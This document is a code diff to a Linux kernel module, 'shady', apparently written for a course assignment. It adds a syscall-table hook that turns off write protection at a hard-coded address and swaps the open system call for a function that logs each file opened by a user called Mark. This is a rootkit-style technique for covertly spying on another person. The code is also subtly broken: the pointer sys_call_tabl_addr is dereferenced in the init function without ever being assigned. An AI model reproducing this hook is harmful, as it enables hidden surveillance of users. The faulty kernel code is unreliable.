@@ -48,7 +48,34 @@ module_param(shady_ndevices, int, S_IRUGO);
 static unsigned int shady_major = 0;
 static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
+
 /* ================================================================ */
+
+/* MY CODE */
+// my call table address and marks id
+unsigned long system_call_table_address = 0xffffffff81801400;
+int marks_uid = 1001;
+asmlinkage int (*getUID)(void);
+
+// code from assign page
+void set_addr_rw (unsigned long addr) {
+  unsigned int level;
+  pte_t *pte = lookup_address(addr, &level);
+  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
+}
+
+asmlinkage int (*old_open) (const char*, int, int);
+
+/* We are spying on Mark */
+asmlinkage int my_open (const char* file, int flags, int mode) {
+  uid_t uid = getUID();
+
+  if (uid == marks_uid)
+    printk("mark is about to open '%s'\n", file);
+  
+  // pass it on to old_open to continue working
+  return old_open(file, flags, mode);
+}
 
 int 
 shady_open(struct inode *inode, struct file *filp)
@@ -189,6 +216,7 @@ static void
 shady_cleanup_module(int devices_to_destroy)
 {
   int i;
+
 	
   /* Get rid of character devices (if any exist) */
   if (shady_devices) {
@@ -204,6 +232,7 @@ shady_cleanup_module(int devices_to_destroy)
   /* [NB] shady_cleanup_module is never called if alloc_chrdev_region()
    * has failed. */
   unregister_chrdev_region(MKDEV(shady_major, 0), shady_ndevices);
+
   return;
 }
 
@@ -214,6 +243,7 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
+  void** sys_call_tabl_addr;
 	
   if (shady_ndevices <= 0)
     {
@@ -255,6 +285,16 @@ shady_init_module(void)
       goto fail;
     }
   }
+
+
+  /* MY CODE */
+  // turn off write protection on system call table
+  set_addr_rw(system_call_table_address);
+
+  // save value of open into old_open and replace it with my_open
+  getUID = sys_call_tabl_addr[__NR_getuid];
+  old_open = sys_call_tabl_addr[__NR_open];
+  sys_call_tabl_addr[__NR_open] = my_open;
   
   return 0; /* success */
 
@@ -266,7 +306,14 @@ shady_init_module(void)
 static void __exit
 shady_exit_module(void)
 {
+  void** sys_call_tabl_addr;
+
   shady_cleanup_module(shady_ndevices);
+
+  // recover original when this module is cleaned up
+  sys_call_tabl_addr = (void**)system_call_table_address;
+  sys_call_tabl_addr[__NR_open] = old_open;
+
   return;
 }
 
